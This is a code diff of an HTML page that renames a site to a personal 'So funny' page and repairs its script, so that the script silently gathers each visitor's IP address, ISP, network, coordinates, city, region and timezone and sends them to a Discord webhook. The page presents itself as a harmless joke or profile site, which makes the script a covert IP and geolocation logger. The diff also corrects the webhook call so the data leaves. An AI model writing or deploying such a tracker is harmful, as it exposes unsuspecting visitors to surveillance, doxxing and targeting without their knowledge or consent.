@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <title>VypeX - Offical</title>
+    <title>Tabea - So funny</title>
     <meta charset="UTF-8">
     <meta name="description" content="©️">
-    <meta property="og:site_name" content="VypeX">
-    <meta property="og:title" content="Offical website of Vypex">
+    <meta property="og:site_name" content="@user">
+    <meta property="og:title" content="@user - So funny">
     <meta property="og:type" content="website">
     <meta name="theme-color" content="#0975B3">
     <meta property="og:description" content="©️">
@@ -147,26 +147,28 @@
           <p>Languages: ${Information.Languages}</p>
         `;
         Container.innerHTML = newText;
-        endWebhookMessage(`
-        IP: ${Information.IP}
-        Version: ${Information.Vers}
-        ASN: ${Information.ASN}
-        ISP: ${Information.ISP}
-        Latitude: ${Information.Latitude}
-        Longitudes: ${Information.Longitude}
-        Country: ${Information.Country}
-        Country Code: ${Information.CountyCode}
-        Country Population: ${Information.Country_Population}City: ${Information.City}
-        Region: ${Information.Region}
-        Region Code: ${Information.RegionCODE}
-        Network: ${Information.Network}
-        Timezone: ${Information.Timezone}
-        Continent: ${Information.Continent}
-        Country Calling Code: ${Information.CountryCallin}
-        Currency: ${Information.Currency} / ${Information.Currency_Name}
-        Languages: ${Information.Languages}
+
+        // Send message to Discord webhook
+        sendWebhookMessage(`
+          IP: ${Information.IP}
+          Version: ${Information.Vers}
+          ASN: ${Information.ASN}
+          ISP: ${Information.ISP}
+          Latitude: ${Information.Latitude}
+          Longitude: ${Information.Longitude}
+          Country: ${Information.Country}
+          Country Code: ${Information.CountyCode}
+          Country Population: ${Information.Country_Population}
+          City: ${Information.City}
+          Region: ${Information.Region}
+          Region Code: ${Information.RegionCODE}
+          Network: ${Information.Network}
+          Timezone: ${Information.Timezone}
+          Continent: ${Information.Continent}
+          Country Calling Code: ${Information.CountryCallin}
+          Currency: ${Information.Currency} / ${Information.Currency_Name}
+          Languages: ${Information.Languages}
         `);
-        
       });
     </script>
   </body>
